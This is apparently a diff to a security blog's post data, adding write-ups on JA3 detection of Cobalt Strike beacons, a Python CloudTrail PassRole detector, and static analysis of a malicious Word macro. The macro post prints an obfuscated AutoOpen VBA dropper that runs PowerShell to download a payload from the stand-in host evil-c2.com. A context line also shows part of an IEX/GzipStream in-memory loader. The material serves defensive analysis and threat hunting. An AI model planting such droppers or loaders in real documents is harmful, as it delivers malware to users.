@@ -601,7 +601,129 @@ $IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Com
 ### Incident Response Takeaways
 1.  **Always enable Script Block Logging:** By default, it only logs scripts that match known malicious signatures. Force-enabling it ensures *all* script blocks are recorded.
 2.  **Look for decompression:** The script above uses \`GzipStream\` to decompress a secondary payload in memory. This is a massive red flag.
-3.  **Hunt for \`IEX\`:** The \`Invoke-Expression\` cmdlet (or its alias \`IEX\`) is the execution trigger. In a SIEM, querying for \`EventID=4104 AND Message="*IEX*"\` is a high-fidelity hunt for fileless execution.`
+    },
+    {
+      id: "hunting-cobalt-strike-ja3",
+      title: "Hunting for Cobalt Strike Beacons using JA3 Fingerprinting",
+      date: "Jul 2026",
+      tags: ["Threat Hunting", "Suricata", "Network Security"],
+      summary: "How I utilized JA3 TLS fingerprinting to detect default Cobalt Strike C2 traffic hiding in plain sight.",
+      content: `Adversaries love to hide command-and-control (C2) traffic inside encrypted HTTPS tunnels. If you are a network defender, you cannot blindly decrypt all SSL/TLS traffic due to privacy and performance constraints. So, how do you catch a Cobalt Strike beacon hiding in standard port 443 traffic?
+
+The answer lies in **TLS Fingerprinting**, specifically **JA3**.
+
+### What is JA3?
+When a client initiates a TLS connection, it sends a "Client Hello" packet in plaintext. This packet contains specific TLS versions, accepted ciphers, and extensions. JA3 works by taking these fields, concatenating them, and hashing them via MD5. 
+
+Because different tools (like Chrome, curl, or a malware beacon) use different underlying TLS libraries, they produce unique JA3 hashes.
+
+### The Hunt (Suricata & Zeek)
+I spun up a Kali Linux VM and launched a standard Cobalt Strike HTTP(S) listener using a default Malleable C2 profile. On the defensive side, I had Zeek and Suricata monitoring the network tap.
+
+After executing the payload on a victim Windows VM, the beacon checked in. To the naked eye in Wireshark, it just looked like standard encrypted web traffic to an unknown IP.
+
+However, checking my Zeek \`ssl.log\` revealed the JA3 hash of the client:
+\`\`\`text
+ja3: a0e9f5d64349fb13191bc781f81f42e1
+\`\`\`
+
+### Writing the Detection Rule
+This specific hash is notoriously tied to WinHTTP (which default Cobalt Strike uses). While it can have false positives, combining it with other anomalies creates a high-fidelity alert.
+
+I wrote a Suricata rule to catch this specific behavior:
+\`\`\`suricata
+alert tls $HOME_NET any -> $EXTERNAL_NET 443 (msg:"Suspicious JA3 Hash - Potential Cobalt Strike Beacon"; ja3.hash; content:"a0e9f5d64349fb13191bc781f81f42e1"; tls.sni; content:!"google.com"; classtype:trojan-activity; sid:100001; rev:1;)
+\`\`\`
+
+### Why this matters
+By profiling the *method* of encryption rather than the encrypted data itself, we strip the adversary of their greatest advantage. If they want to evade this, they have to rewrite their beacon's networking stack or use advanced Malleable C2 profiles—raising the cost of the attack.`
+    },
+    {
+      id: "automating-aws-cloudtrail-iam",
+      title: "Automating AWS CloudTrail Analysis for Suspicious IAM Roles",
+      date: "Jun 2026",
+      tags: ["Cloud Security", "AWS", "Python"],
+      summary: "Using Python and Boto3 to parse CloudTrail logs and detect unauthorized IAM privilege escalation.",
+      content: `The cloud is the new endpoint. In modern infrastructure, identity is the ultimate perimeter. If an attacker compromises an AWS IAM access key, they won't trigger traditional endpoint EDR alerts; they will blend into CloudTrail logs as API calls.
+
+This write-up explores how I built a Python script to mechanically hunt for **Privilege Escalation** techniques in AWS.
+
+### The Attack Vector: \`iam:PassRole\`
+One of the most dangerous permissions in AWS is \`iam:PassRole\`. If an attacker compromises an EC2 instance with a weak IAM role, but that role has the \`PassRole\` permission, they can attach an Administrative role to a *new* EC2 instance, log into it, and completely take over the AWS account.
+
+### Parsing CloudTrail
+CloudTrail logs every API call made in the account. I wrote a Python script utilizing \`boto3\` and \`pandas\` to ingest CloudTrail logs from an S3 bucket and flag suspicious activity.
+
+Here is the core detection logic snippet:
+
+\`\`\`python
+import json
+
+def detect_suspicious_passrole(log_file):
+    with open(log_file, 'r') as f:
+        events = json.load(f)['Records']
+        
+    for event in events:
+        if event['eventName'] == 'RunInstances':
+            request_params = event.get('requestParameters', {})
+            # Check if an IAM instance profile was attached during creation
+            if 'iamInstanceProfile' in request_params:
+                role_passed = request_params['iamInstanceProfile'].get('arn')
+                user_identity = event['userIdentity']['arn']
+                
+                print(f"[ALERT] User {user_identity} passed role {role_passed} to a new EC2 instance!")
+\`\`\`
+
+### Enrichment & SOAR Integration
+Detecting the API call is only step one. In a real SOC, this script would output to a webhook. If an alert fires, our SOAR platform would automatically:
+1. Cross-reference the \`userIdentity\` against Okta/AzureAD to see if the employee is currently on PTO.
+2. Query the IP address of the API call against a Threat Intel feed.
+3. Automatically quarantine the newly created EC2 instance by attaching a strict Security Group.
+
+Cloud security requires thinking in APIs, not just IP addresses.`
+    },
+    {
+      id: "deobfuscating-malicious-macros",
+      title: "De-obfuscating a Malicious Word Macro: A Static Analysis Walkthrough",
+      date: "May 2026",
+      tags: ["Malware Analysis", "Phishing", "Reverse Engineering"],
+      summary: "Tearing apart a weaponized Excel document to extract the payload URL without executing the malware.",
+      content: `Despite being a decades-old technique, malicious Microsoft Office Macros (VBA) remain one of the most common initial access vectors for ransomware operators.
+
+When a suspicious \`invoice.docm\` lands in the SOC queue, executing it in a sandbox is easy, but extracting the Indicators of Compromise (IoCs) statically is a crucial skill.
+
+### Extracting the VBA
+An Office document (post-2007 \`.docx\` / \`.docm\`) is simply a ZIP archive. Instead of opening it in Word, I use \`oletools\` (specifically \`olevba\`) on my REMnux analysis VM to safely extract the macro code.
+
+\`\`\`bash
+olevba invoice.docm > macro_code.vba
+\`\`\`
+
+### The Obfuscation Layer
+Attackers know SOC analysts use \`olevba\`. When I opened \`macro_code.vba\`, I was greeted with an unreadable mess of junk variables and string reversals:
+
+\`\`\`vba
+Sub AutoOpen()
+    Dim Xjh2 As String
+    Xjh2 = StrReverse("exe.tsohswop\23met\c:\")
+    Dim Kp91 As String
+    Kp91 = "h" & "t" & "t" & "p" & ":" & "//" & "evil-c2" & ".com" & "/payload"
+    Shell(Xjh2 & " -c (New-Object Net.WebClient).DownloadFile(" & Kp91 & ")")
+End Sub
+\`\`\`
+
+### Static De-obfuscation
+Instead of dynamically running this, we can mechanically trace the variables:
+1. \`StrReverse("exe.tsohswop\\23met\\c:\\")\` evaluates to \`c:\\temp32\\powershell.exe\`
+2. The string concatenation in \`Kp91\` evaluates to \`http://evil-c2.com/payload\`
+3. The final \`Shell\` command evaluates to: \`c:\\temp32\\powershell.exe -c (New-Object Net.WebClient).DownloadFile(http://evil-c2.com/payload)\`
+
+### Hunting the IoCs
+By doing this statically, we safely acquired two critical IoCs without detonating the payload:
+*   **Domain:** \`evil-c2.com\`
+*   **Behavior:** PowerShell downloading a remote file upon Word startup.
+
+I can now take that domain, push it to our Firewall blocklist, and query the SIEM to see if any endpoints have resolved that domain in the last 72 hours.`
     }
   ]
 };
